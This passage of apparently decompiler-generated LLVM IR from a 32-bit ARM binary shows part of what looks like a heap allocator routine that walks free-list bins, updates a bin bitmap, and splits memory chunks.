  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r2.global-to-local, align 4
  %v1_13d68 = load i32, i32* %r8.global-to-local, align 4
  %v2_13d68 = add i32 %v1_13d68, add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796)
  %v3_13d68 = inttoptr i32 %v2_13d68 to i32*
  %v4_13d68 = load i32, i32* %v3_13d68, align 4
  %v3_13d6c = udiv i32 %v0_13d5c, 8
  store i32 %v3_13d6c, i32* %r0.global-to-local, align 4
  %v4_13d70 = mul nuw i32 %v3_13d6c, 8
  %v5_13d70 = add i32 %v4_13d68, %v4_13d70
  store i32 %v5_13d70, i32* %r3.global-to-local, align 4
  %v1_13d74 = add i32 %v5_13d70, 44
  store i32 %v1_13d74, i32* %ip.global-to-local, align 4
  %v1_13d78 = add i32 %v5_13d70, 52
  %v2_13d78 = inttoptr i32 %v1_13d78 to i32*
  %v3_13d78 = load i32, i32* %v2_13d78, align 4
  store i32 %v3_13d78, i32* @lr, align 4
  br label %dec_label_pc_13dd8

dec_label_pc_13d80:                               ; preds = %dec_label_pc_13d5c
  store i32 %v0_13d5c, i32* %r0.global-to-local, align 4
  %v1_13d84 = call i32 @function_13b10(i32 %v0_13d5c)
  store i32 %v1_13d84, i32* %r0.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %ip.global-to-local, align 4
  %v1_13d8c = load i32, i32* %r8.global-to-local, align 4
  %v2_13d8c = add i32 %v1_13d8c, add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796)
  %v3_13d8c = inttoptr i32 %v2_13d8c to i32*
  %v4_13d8c = load i32, i32* %v3_13d8c, align 4
  %v4_13d90 = mul i32 %v1_13d84, 8
  %v5_13d90 = add i32 %v4_13d8c, %v4_13d90
  store i32 %v5_13d90, i32* %r3.global-to-local, align 4
  %v1_13d94 = add i32 %v5_13d90, 44
  store i32 %v1_13d94, i32* %ip.global-to-local, align 4
  %v1_13d98 = add i32 %v5_13d90, 52
  %v2_13d98 = inttoptr i32 %v1_13d98 to i32*
  %v3_13d98 = load i32, i32* %v2_13d98, align 4
  store i32 %v3_13d98, i32* @lr, align 4
  %v9_13d9c = icmp eq i32 %v3_13d98, %v1_13d94
  br i1 %v9_13d9c, label %dec_label_pc_13dd8, label %dec_label_pc_13da4

dec_label_pc_13da4:                               ; preds = %dec_label_pc_13d80
  %v1_13da4 = add i32 %v5_13d90, 56
  %v2_13da4 = inttoptr i32 %v1_13da4 to i32*
  %v3_13da4 = load i32, i32* %v2_13da4, align 4
  store i32 %v3_13da4, i32* %r1.global-to-local, align 4
  %v1_13da8 = add i32 %v3_13da4, 4
  %v2_13da8 = inttoptr i32 %v1_13da8 to i32*
  %v3_13da8 = load i32, i32* %v2_13da8, align 4
  store i32 %v3_13da8, i32* %r3.global-to-local, align 4
  %v0_13dac = load i32, i32* %r4.global-to-local, align 4
  %v3_13dac = icmp ult i32 %v0_13dac, %v3_13da8
  br i1 %v3_13dac, label %.thread, label %dec_label_pc_13dc8.preheader

.thread:                                          ; preds = %dec_label_pc_13da4
  store i32 %v1_13d94, i32* @lr, align 4
  store i32 %v3_13da4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13dd8

dec_label_pc_13dc8.preheader:                     ; preds = %dec_label_pc_13da4
  %v2_13db4 = or i32 %v0_13dac, 1
  store i32 %v2_13db4, i32* %r2.global-to-local, align 4
  %v1_13dc8179 = add i32 %v3_13d98, 4
  %v2_13dc8180 = inttoptr i32 %v1_13dc8179 to i32*
  %v3_13dc8181 = load i32, i32* %v2_13dc8180, align 4
  store i32 %v3_13dc8181, i32* %r3.global-to-local, align 4
  %v3_13dcc183 = icmp ult i32 %v2_13db4, %v3_13dc8181
  br i1 %v3_13dcc183, label %dec_label_pc_13dc4, label %dec_label_pc_13dd4

dec_label_pc_13dc4:                               ; preds = %dec_label_pc_13dc8.preheader, %dec_label_pc_13dc4
  %v0_13dd4184 = phi i32 [ %v3_13dc4, %dec_label_pc_13dc4 ], [ %v3_13d98, %dec_label_pc_13dc8.preheader ]
  %v1_13dc4 = add i32 %v0_13dd4184, 8
  %v2_13dc4 = inttoptr i32 %v1_13dc4 to i32*
  %v3_13dc4 = load i32, i32* %v2_13dc4, align 4
  store i32 %v3_13dc4, i32* @lr, align 4
  %v1_13dc8 = add i32 %v3_13dc4, 4
  %v2_13dc8 = inttoptr i32 %v1_13dc8 to i32*
  %v3_13dc8 = load i32, i32* %v2_13dc8, align 4
  store i32 %v3_13dc8, i32* %r3.global-to-local, align 4
  %v3_13dcc = icmp ult i32 %v2_13db4, %v3_13dc8
  br i1 %v3_13dcc, label %dec_label_pc_13dc4, label %dec_label_pc_13dd4

dec_label_pc_13dd4:                               ; preds = %dec_label_pc_13dc4, %dec_label_pc_13dc8.preheader
  %v0_13dd4.lcssa = phi i32 [ %v3_13d98, %dec_label_pc_13dc8.preheader ], [ %v3_13dc4, %dec_label_pc_13dc4 ]
  %v1_13dd4 = add i32 %v0_13dd4.lcssa, 12
  %v2_13dd4 = inttoptr i32 %v1_13dd4 to i32*
  %v3_13dd4 = load i32, i32* %v2_13dd4, align 4
  store i32 %v3_13dd4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13dd8

dec_label_pc_13dd8:                               ; preds = %.thread, %dec_label_pc_13d80, %dec_label_pc_13d64, %dec_label_pc_13dd4
  %v0_13df8 = phi i32 [ %v1_13d94, %dec_label_pc_13d80 ], [ %v1_13d74, %dec_label_pc_13d64 ], [ %v3_13dd4, %dec_label_pc_13dd4 ], [ %v3_13da4, %.thread ]
  %v0_13dec = phi i32 [ %v1_13d84, %dec_label_pc_13d80 ], [ %v3_13d6c, %dec_label_pc_13d64 ], [ %v1_13d84, %dec_label_pc_13dd4 ], [ %v1_13d84, %.thread ]
  %v1_13ddc = phi i32 [ %v1_13d8c, %dec_label_pc_13d80 ], [ %v1_13d68, %dec_label_pc_13d64 ], [ %v1_13d8c, %dec_label_pc_13dd4 ], [ %v1_13d8c, %.thread ]
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r2.global-to-local, align 4
  %v2_13ddc = add i32 %v1_13ddc, add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796)
  %v3_13ddc = inttoptr i32 %v2_13ddc to i32*
  %v4_13ddc = load i32, i32* %v3_13ddc, align 4
  %v3_13de0 = sdiv i32 %v0_13dec, 32
  store i32 %v3_13de0, i32* %r3.global-to-local, align 4
  %v4_13de4 = mul nsw i32 %v3_13de0, 4
  %v5_13de4 = add i32 %v4_13ddc, %v4_13de4
  store i32 %v5_13de4, i32* %r1.global-to-local, align 4
  %v1_13de8 = add i32 %v5_13de4, 820
  %v2_13de8 = inttoptr i32 %v1_13de8 to i32*
  %v3_13de8 = load i32, i32* %v2_13de8, align 4
  %v1_13dec = urem i32 %v0_13dec, 32
  store i32 %v1_13dec, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_13df4 = shl i32 1, %v1_13dec
  %v8_13df4 = or i32 %v3_13de8, %v7_13df4
  store i32 %v8_13df4, i32* %r3.global-to-local, align 4
  %v1_13df8 = load i32, i32* @r6, align 4
  %v2_13df8 = add i32 %v1_13df8, 12
  %v3_13df8 = inttoptr i32 %v2_13df8 to i32*
  store i32 %v0_13df8, i32* %v3_13df8, align 4
  %v0_13dfc = load i32, i32* @lr, align 4
  %v1_13dfc = load i32, i32* @r6, align 4
  %v2_13dfc = add i32 %v1_13dfc, 8
  %v3_13dfc = inttoptr i32 %v2_13dfc to i32*
  store i32 %v0_13dfc, i32* %v3_13dfc, align 4
  %v0_13e00 = load i32, i32* %r3.global-to-local, align 4
  %v1_13e00 = load i32, i32* %r1.global-to-local, align 4
  %v2_13e00 = add i32 %v1_13e00, 820
  %v3_13e00 = inttoptr i32 %v2_13e00 to i32*
  store i32 %v0_13e00, i32* %v3_13e00, align 4
  %v0_13e04 = load i32, i32* @r6, align 4
  %v1_13e04 = load i32, i32* @lr, align 4
  %v2_13e04 = add i32 %v1_13e04, 12
  %v3_13e04 = inttoptr i32 %v2_13e04 to i32*
  store i32 %v0_13e04, i32* %v3_13e04, align 4
  %v0_13e08 = load i32, i32* @r6, align 4
  %v1_13e08 = load i32, i32* %ip.global-to-local, align 4
  %v2_13e08 = add i32 %v1_13e08, 8
  %v3_13e08 = inttoptr i32 %v2_13e08 to i32*
  store i32 %v0_13e08, i32* %v3_13e08, align 4
  %v0_13e24.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13e24

dec_label_pc_13e10:                               ; preds = %dec_label_pc_13cb0, %dec_label_pc_13c68, %dec_label_pc_13cc4
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r1.global-to-local, align 4
  %v4_13e18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  store i32 %v4_13e18, i32* @sb, align 4
  %v0_13e1c = load i32, i32* @sl, align 4
  %v1_13e1c = add i32 %v0_13e1c, 16
  store i32 %v1_13e1c, i32* @fp, align 4
  %v1_13e20 = add i32 %v4_13e18, 52
  store i32 %v1_13e20, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13e24

dec_label_pc_13e24:                               ; preds = %dec_label_pc_13dd8, %dec_label_pc_13e10
  %v0_13d44 = phi i32 [ %v0_13e24.pre, %dec_label_pc_13dd8 ], [ %v1_13e20, %dec_label_pc_13e10 ]
  %v1_13e24 = add i32 %v0_13d44, 12
  %v2_13e24 = inttoptr i32 %v1_13e24 to i32*
  %v3_13e24 = load i32, i32* %v2_13e24, align 4
  store i32 %v3_13e24, i32* @r6, align 4
  %v9_13e28 = icmp eq i32 %v3_13e24, %v0_13d44
  br i1 %v9_13e28, label %dec_label_pc_13e30, label %dec_label_pc_13cd8

dec_label_pc_13e30:                               ; preds = %dec_label_pc_13e24
  %v0_13e30 = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_13e30, 256
  %v0_13ee8.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_13e30.dec_label_pc_13ee8_crit_edge, label %dec_label_pc_13e38

dec_label_pc_13e30.dec_label_pc_13ee8_crit_edge:  ; preds = %dec_label_pc_13e30
  %.pre200 = mul i32 %v0_13ee8.pre, 8
  br label %dec_label_pc_13ee8

dec_label_pc_13e38:                               ; preds = %dec_label_pc_13e30
  %v4_13e38 = mul i32 %v0_13ee8.pre, 8
  %v5_13e38 = add i32 %v4_13e38, %v0_13d44
  store i32 %v5_13e38, i32* %r3.global-to-local, align 4
  %v1_13e3c = add i32 %v5_13e38, -8
  store i32 %v1_13e3c, i32* %r1.global-to-local, align 4
  %v1_13e40 = add i32 %v5_13e38, 4
  %v2_13e40 = inttoptr i32 %v1_13e40 to i32*
  %storemerge.pre = load i32, i32* %v2_13e40, align 4
  br label %dec_label_pc_13ee0

dec_label_pc_13e48:                               ; preds = %dec_label_pc_13ee0
  %v1_13e48 = add i32 %v1_13e70, 4
  %v2_13e48 = inttoptr i32 %v1_13e48 to i32*
  %v3_13e48 = load i32, i32* %v2_13e48, align 4
  store i32 %v3_13e48, i32* %r3.global-to-local, align 4
  %v1_13e4c = and i32 %v3_13e48, -4
  store i32 %v1_13e4c, i32* %r2.global-to-local, align 4
  %v3_13e50 = icmp ult i32 %v1_13e4c, %v0_13e30
  %v1_13e54 = add i32 %v1_13e70, 12
  %v2_13e54 = inttoptr i32 %v1_13e54 to i32*
  %v3_13e54 = load i32, i32* %v2_13e54, align 4
  store i32 %v3_13e54, i32* %r0.global-to-local, align 4
  br i1 %v3_13e50, label %dec_label_pc_13ee0, label %dec_label_pc_13e5c

dec_label_pc_13e5c:                               ; preds = %dec_label_pc_13e48
  %v1_13e5c = add i32 %v1_13e70, 8
  %v2_13e5c = inttoptr i32 %v1_13e5c to i32*
  %v3_13e5c = load i32, i32* %v2_13e5c, align 4
  store i32 %v3_13e5c, i32* %r1.global-to-local, align 4
  %v1_13e60 = add i32 %v3_13e5c, 12
  %v2_13e60 = inttoptr i32 %v1_13e60 to i32*
  %v3_13e60 = load i32, i32* %v2_13e60, align 4
  store i32 %v3_13e60, i32* %r3.global-to-local, align 4
  %v9_13e64 = icmp eq i32 %v3_13e60, %v1_13e70
  br i1 %v9_13e64, label %dec_label_pc_13e6c, label %dec_label_pc_13e78

dec_label_pc_13e6c:                               ; preds = %dec_label_pc_13e5c
  %v1_13e6c = add i32 %v3_13e54, 8
  %v2_13e6c = inttoptr i32 %v1_13e6c to i32*
  %v3_13e6c = load i32, i32* %v2_13e6c, align 4
  store i32 %v3_13e6c, i32* %r3.global-to-local, align 4
  %v9_13e70 = icmp eq i32 %v3_13e6c, %v1_13e70
  br i1 %v9_13e70, label %dec_label_pc_13e7c, label %dec_label_pc_13e78

dec_label_pc_13e78:                               ; preds = %dec_label_pc_13e5c, %dec_label_pc_13e6c
  %v0_13e78 = call i32 @function_14e70()
  store i32 %v0_13e78, i32* %r0.global-to-local, align 4
  %v0_13e7c.pre = load i32, i32* @sl, align 4
  %v1_13e7c.pre = load i32, i32* @r2, align 4
  %v0_13e84.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_13e7c

dec_label_pc_13e7c:                               ; preds = %dec_label_pc_13e6c, %dec_label_pc_13e78
  %v1_13e84 = phi i32 [ %v3_13e54, %dec_label_pc_13e6c ], [ %v0_13e78, %dec_label_pc_13e78 ]
  %v0_13e84 = phi i32 [ %v3_13e5c, %dec_label_pc_13e6c ], [ %v0_13e84.pre, %dec_label_pc_13e78 ]
  %v1_13e7c = phi i32 [ %v1_13e4c, %dec_label_pc_13e6c ], [ %v1_13e7c.pre, %dec_label_pc_13e78 ]
  %v0_13e7c = phi i32 [ %v0_13e30, %dec_label_pc_13e6c ], [ %v0_13e7c.pre, %dec_label_pc_13e78 ]
  %v2_13e7c = sub i32 %v1_13e7c, %v0_13e7c
  store i32 %v2_13e7c, i32* %lr.global-to-local, align 4
  %v2_13e84 = add i32 %v1_13e84, 8
  %v3_13e84 = inttoptr i32 %v2_13e84 to i32*
  store i32 %v0_13e84, i32* %v3_13e84, align 4
  %v0_13e88 = load i32, i32* %r0.global-to-local, align 4
  %v1_13e88 = load i32, i32* %r1.global-to-local, align 4
  %v2_13e88 = add i32 %v1_13e88, 12
  %v3_13e88 = inttoptr i32 %v2_13e88 to i32*
  store i32 %v0_13e88, i32* %v3_13e88, align 4
  %v0_13e8c = load i32, i32* %ip.global-to-local, align 4
  %v1_13e8c = add i32 %v0_13e8c, 8
  store i32 %v1_13e8c, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_13e7c, 15
  br i1 %tmp207, label %dec_label_pc_13eac, label %dec_label_pc_13e94

dec_label_pc_13e94:                               ; preds = %dec_label_pc_13e7c
  %v1_13e94 = load i32, i32* %r2.global-to-local, align 4
  %v2_13e94 = add i32 %v1_13e94, %v0_13e8c
  store i32 %v2_13e94, i32* %r2.global-to-local, align 4
  %v1_13e98 = add i32 %v2_13e94, 4
  %v2_13e98 = inttoptr i32 %v1_13e98 to i32*
  %v3_13e98 = load i32, i32* %v2_13e98, align 4
  store i32 %v3_13e98, i32* %r3.global-to-local, align 4
  store i32 %v1_13e8c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13ea0

dec_label_pc_13ea0.loopexit:                      ; preds = %dec_label_pc_13d40
  %v1_13d4c = load i32, i32* @r6, align 4
  %v2_13d4c = load i32, i32* @sl, align 4
  %v3_13d4c = add i32 %v2_13d4c, %v1_13d4c
  store i32 %v3_13d4c, i32* %r2.global-to-local, align 4
  %v2_13d50 = add i32 %v3_13d4c, 4
  %v3_13d50 = inttoptr i32 %v2_13d50 to i32*
  %v4_13d50 = load i32, i32* %v3_13d50, align 4
  store i32 %v4_13d50, i32* %r3.global-to-local, align 4
  %v2_13d54 = add i32 %v1_13d4c, 8
  store i32 %v2_13d54, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13ea0

dec_label_pc_13ea0:                               ; preds = %.dec_label_pc_13ea0_crit_edge, %dec_label_pc_13ea0.loopexit, %dec_label_pc_13e94
  %v1_13ea4 = phi i32 [ %v4_13fc8, %.dec_label_pc_13ea0_crit_edge ], [ %v3_13d4c, %dec_label_pc_13ea0.loopexit ], [ %v2_13e94, %dec_label_pc_13e94 ]
  %v0_13ea0 = phi i32 [ %v7_13fc8, %.dec_label_pc_13ea0_crit_edge ], [ %v4_13d50, %dec_label_pc_13ea0.loopexit ], [ %v3_13e98, %dec_label_pc_13e94 ]
  %v1_13ea0 = or i32 %v0_13ea0, 1
  store i32 %v1_13ea0, i32* %r3.global-to-local, align 4
  %v2_13ea4 = add i32 %v1_13ea4, 4
  %v3_13ea4 = inttoptr i32 %v2_13ea4 to i32*
  store i32 %v1_13ea0, i32* %v3_13ea4, align 4
  br label %dec_label_pc_14460

dec_label_pc_13eac:                               ; preds = %dec_label_pc_13e7c
  %v1_13eac = load i32, i32* @sl, align 4
  %v2_13eac = add i32 %v1_13eac, %v0_13e8c
  store i32 %v2_13eac, i32* %r2.global-to-local, align 4
  %v1_13eb0 = or i32 %v1_13eac, 1
  store i32 %v1_13eb0, i32* %r3.global-to-local, align 4
  %v0_13eb4 = load i32, i32* %lr.global-to-local, align 4
  %v1_13eb4 = or i32 %v0_13eb4, 1
  store i32 %v1_13eb4, i32* %r1.global-to-local, align 4
  store i32 %v1_13e8c, i32* %r4.global-to-local, align 4
  %v2_13ebc = add i32 %v0_13e8c, 4
  %v3_13ebc = inttoptr i32 %v2_13ebc to i32*
  store i32 %v1_13eb0, i32* %v3_13ebc, align 4
  %v0_13ec0 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ec0 = load i32, i32* @r6, align 4
  %v2_13ec0 = add i32 %v1_13ec0, 8
  %v3_13ec0 = inttoptr i32 %v2_13ec0 to i32*
  store i32 %v0_13ec0, i32* %v3_13ec0, align 4
  %v0_13ec4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ec4 = load i32, i32* @r6, align 4
  %v2_13ec4 = add i32 %v1_13ec4, 12
  %v3_13ec4 = inttoptr i32 %v2_13ec4 to i32*
  store i32 %v0_13ec4, i32* %v3_13ec4, align 4
  %v0_13ec8 = load i32, i32* %lr.global-to-local, align 4
  %v1_13ec8 = load i32, i32* %r2.global-to-local, align 4
  %v3_13ec8 = add i32 %v1_13ec8, %v0_13ec8
  %v4_13ec8 = inttoptr i32 %v3_13ec8 to i32*
  store i32 %v0_13ec8, i32* %v4_13ec8, align 4
  %v0_13ecc = load i32, i32* %r1.global-to-local, align 4
  %v1_13ecc = load i32, i32* %r2.global-to-local, align 4
  %v2_13ecc = add i32 %v1_13ecc, 4
  %v3_13ecc = inttoptr i32 %v2_13ecc to i32*
  store i32 %v0_13ecc, i32* %v3_13ecc, align 4
  %v0_13ed0 = load i32, i32* @r6, align 4
  %v1_13ed0 = load i32, i32* %r2.global-to-local, align 4
  %v2_13ed0 = add i32 %v1_13ed0, 12
  %v3_13ed0 = inttoptr i32 %v2_13ed0 to i32*
  store i32 %v0_13ed0, i32* %v3_13ed0, align 4
  %v0_13ed4 = load i32, i32* @r6, align 4
  %v1_13ed4 = load i32, i32* %r2.global-to-local, align 4
  %v2_13ed4 = add i32 %v1_13ed4, 8
  %v3_13ed4 = inttoptr i32 %v2_13ed4 to i32*
  store i32 %v0_13ed4, i32* %v3_13ed4, align 4
  br label %dec_label_pc_14460

dec_label_pc_13ee0:                               ; preds = %dec_label_pc_13e48, %dec_label_pc_13e38
  %v1_13e70 = phi i32 [ %storemerge.pre, %dec_label_pc_13e38 ], [ %v3_13e54, %dec_label_pc_13e48 ]
  store i32 %v1_13e70, i32* %ip.global-to-local, align 4
  %v9_13ee0 = icmp eq i32 %v1_13e70, %v1_13e3c
  br i1 %v9_13ee0, label %dec_label_pc_13ee8.loopexit, label %dec_label_pc_13e48

dec_label_pc_13ee8.loopexit:                      ; preds = %dec_label_pc_13ee0
  br label %dec_label_pc_13ee8

dec_label_pc_13ee8:                               ; preds = %dec_label_pc_13e30.dec_label_pc_13ee8_crit_edge, %dec_label_pc_13ee8.loopexit
  %v4_13f18.pre-phi = phi i32 [ %.pre200, %dec_label_pc_13e30.dec_label_pc_13ee8_crit_edge ], [ %v4_13e38, %dec_label_pc_13ee8.loopexit ]
  %v1_13ee8 = add i32 %v0_13ee8.pre, 1
  store i32 %v1_13ee8, i32* %r2.global-to-local, align 4
  %v1_13eec = urem i32 %v1_13ee8, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r0.global-to-local, align 4
  %v6_13ef8 = shl i32 1, %v1_13eec
  store i32 %v6_13ef8, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_13f00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80828) to i32*), align 4
  store i32 %v4_13f00, i32* %r3.global-to-local, align 4
  %v3_13f04 = udiv i32 %v1_13ee8, 32
  store i32 %v3_13f04, i32* @r5, align 4
  %v4_13f08 = mul nuw nsw i32 %v3_13f04, 4
  %v5_13f08 = add i32 %v4_13f00, %v4_13f08
  store i32 %v5_13f08, i32* %r2.global-to-local, align 4
  %v1_13f0c = add i32 %v5_13f08, 820
  %v2_13f0c = inttoptr i32 %v1_13f0c to i32*
  %v3_13f0c = load i32, i32* %v2_13f0c, align 4
  store i32 %v3_13f0c, i32* @r4, align 4
  %v1_13f10 = add i32 %v4_13f00, 52
  store i32 %v1_13f10, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_13f18 = add i32 %v1_13f10, %v4_13f18.pre-phi
  store i32 %v5_13f18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f1c

dec_label_pc_13f1c:                               ; preds = %dec_label_pc_13f84, %dec_label_pc_13ee8
  %v1_13f24 = phi i32 [ %v1_13f24.pre, %dec_label_pc_13f84 ], [ %v3_13f0c, %dec_label_pc_13ee8 ]
  %v0_13f24 = phi i32 [ %v0_13f1c.pre, %dec_label_pc_13f84 ], [ %v6_13ef8, %dec_label_pc_13ee8 ]
  %v1_13f1c = sub i32 1, %v0_13f24
  %v2_13f1c = icmp ult i32 %v0_13f24, 2
  %v1_13f1c. = select i1 %v2_13f1c, i32 %v1_13f1c, i32 0
  store i32 %v1_13f1c., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_13f24, %v1_13f24
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_13f1c
  %v5_13f28 = or i32 %v1_13f1c., 1
  store i32 %v5_13f28, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13f34.preheader

bb142:                                            ; preds = %dec_label_pc_13f1c
  %v2_13f2c = icmp eq i32 %v1_13f1c., 0
  br i1 %v2_13f2c, label %.dec_label_pc_13f70.preheader_crit_edge, label %dec_label_pc_13f34.preheader

.dec_label_pc_13f70.preheader_crit_edge:          ; preds = %bb142
  %v0_13f6854.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f70.preheader

dec_label_pc_13f34.preheader:                     ; preds = %bb142, %.thread12
  %v0_13f34.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13f34

dec_label_pc_13f34:                               ; preds = %dec_label_pc_13f34.preheader, %dec_label_pc_13f40
  %v0_13f34 = phi i32 [ %v0_13f34.pre, %dec_label_pc_13f34.preheader ], [ %v1_13f34, %dec_label_pc_13f40 ]
  %v1_13f34 = add i32 %v0_13f34, 1
  store i32 %v1_13f34, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_13f34, 2
  br i1 %tmp208, label %dec_label_pc_14014.loopexit, label %dec_label_pc_13f40

dec_label_pc_13f40:                               ; preds = %dec_label_pc_13f34
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r3.global-to-local, align 4
  %v1_13f44 = load i32, i32* @r8, align 4
  %v2_13f44 = add i32 %v1_13f44, add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796)
  %v3_13f44 = inttoptr i32 %v2_13f44 to i32*
  %v4_13f44 = load i32, i32* %v3_13f44, align 4
  store i32 %v4_13f44, i32* %r2.global-to-local, align 4
  %v4_13f48 = mul i32 %v1_13f34, 4
  %v5_13f48 = add i32 %v4_13f44, %v4_13f48
  store i32 %v5_13f48, i32* %r3.global-to-local, align 4
  %v1_13f4c = add i32 %v5_13f48, 820
  %v2_13f4c = inttoptr i32 %v1_13f4c to i32*
  %v3_13f4c = load i32, i32* %v2_13f4c, align 4
  store i32 %v3_13f4c, i32* @r4, align 4
  %v2_13f50 = icmp eq i32 %v3_13f4c, 0
  br i1 %v2_13f50, label %dec_label_pc_13f34, label %dec_label_pc_13f58

dec_label_pc_13f58:                               ; preds = %dec_label_pc_13f40
  %v4_13f58 = mul i32 %v1_13f34, 256
  %v5_13f58 = add i32 %v4_13f44, %v4_13f58
  store i32 %v5_13f58, i32* %r3.global-to-local, align 4
  %v1_13f5c = add i32 %v5_13f58, 44
  store i32 %v1_13f5c, i32* %r0.global-to-local, align 4
  %v0_13f60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13f60, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13f70.preheader

dec_label_pc_13f70.preheader:                     ; preds = %.dec_label_pc_13f70.preheader_crit_edge, %dec_label_pc_13f58
  %v0_13f6854 = phi i32 [ %v1_13f5c, %dec_label_pc_13f58 ], [ %v0_13f6854.pre, %.dec_label_pc_13f70.preheader_crit_edge ]
  %v0_13f8c = phi i32 [ %v3_13f4c, %dec_label_pc_13f58 ], [ %v1_13f24, %.dec_label_pc_13f70.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_13f60, %dec_label_pc_13f58 ], [ %v0_13f24, %.dec_label_pc_13f70.preheader_crit_edge ]
  %v2_13f7051 = and i32 %ip.promoted, %v0_13f8c
  %v4_13f7053 = icmp eq i32 %v2_13f7051, 0
  br i1 %v4_13f7053, label %dec_label_pc_13f68, label %dec_label_pc_13f78

dec_label_pc_13f68:                               ; preds = %dec_label_pc_13f70.preheader, %dec_label_pc_13f68
  %v2_13f6c56 = phi i32 [ %v2_13f6c, %dec_label_pc_13f68 ], [ %ip.promoted, %dec_label_pc_13f70.preheader ]
  %v0_13f6855 = phi i32 [ %v1_13f68, %dec_label_pc_13f68 ], [ %v0_13f6854, %dec_label_pc_13f70.preheader ]
  %v1_13f68 = add i32 %v0_13f6855, 8
  %v2_13f6c = mul i32 %v2_13f6c56, 2
  %v2_13f70 = and i32 %v2_13f6c, %v0_13f8c
  %v4_13f70 = icmp eq i32 %v2_13f70, 0
  br i1 %v4_13f70, label %dec_label_pc_13f68, label %dec_label_pc_13f70.dec_label_pc_13f78_crit_edge

dec_label_pc_13f70.dec_label_pc_13f78_crit_edge:  ; preds = %dec_label_pc_13f68
  store i32 %v1_13f68, i32* %r0.global-to-local, align 4
  store i32 %v2_13f6c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13f78

dec_label_pc_13f78:                               ; preds = %dec_label_pc_13f70.dec_label_pc_13f78_crit_edge, %dec_label_pc_13f70.preheader
  %v0_13f98 = phi i32 [ %v2_13f6c, %dec_label_pc_13f70.dec_label_pc_13f78_crit_edge ], [ %ip.promoted, %dec_label_pc_13f70.preheader ]
  %v0_13fbc = phi i32 [ %v1_13f68, %dec_label_pc_13f70.dec_label_pc_13f78_crit_edge ], [ %v0_13f6854, %dec_label_pc_13f70.preheader ]
  %v1_13f78 = add i32 %v0_13fbc, 12
  %v2_13f78 = inttoptr i32 %v1_13f78 to i32*
  %v3_13f78 = load i32, i32* %v2_13f78, align 4
  store i32 %v3_13f78, i32* @lr, align 4
  %v9_13f7c = icmp eq i32 %v3_13f78, %v0_13fbc
  br i1 %v9_13f7c, label %dec_label_pc_13f84, label %dec_label_pc_13fa4

dec_label_pc_13f84:                               ; preds = %dec_label_pc_13f78
  store i32 add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796), i32* %r0.global-to-local, align 4
  %v1_13f88 = load i32, i32* @r8, align 4
  %v2_13f88 = add i32 %v1_13f88, add (i32 ptrtoint (i32* @global_var_d514.554 to i32), i32 80796)
  %v3_13f88 = inttoptr i32 %v2_13f88 to i32*
  %v4_13f88 = load i32, i32* %v3_13f88, align 4
  %v2_13f8c = sub i32 -1, %v0_13f98
  %v3_13f8c = and i32 %v0_13f8c, %v2_13f8c
  store i32 %v3_13f8c, i32* @r4, align 4
  %v1_13f90 = load i32, i32* @r5, align 4
  %v4_13f90 = mul i32 %v1_13f90, 4
  %v5_13f90 = add i32 %v4_13f90, %v4_13f88
  store i32 %v5_13f90, i32* %r3.global-to-local, align 4
  %v1_13f94 = add i32 %v0_13fbc, 8
  store i32 %v1_13f94, i32* %r0.global-to-local, align 4
  %v2_13f98 = mul i32 %v0_13f98, 2
  store i32 %v2_13f98, i32* %ip.global-to-local, align 4
  %v2_13f9c = add i32 %v5_13f90, 820
  %v3_13f9c = inttoptr i32 %v2_13f9c to i32*
  store i32 %v3_13f8c, i32* %v3_13f9c, align 4
  %v0_13f1c.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_13f24.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13f1c

dec_label_pc_13fa4:                               ; preds = %dec_label_pc_13f78
  %v1_13fa4 = add i32 %v3_13f78, 4
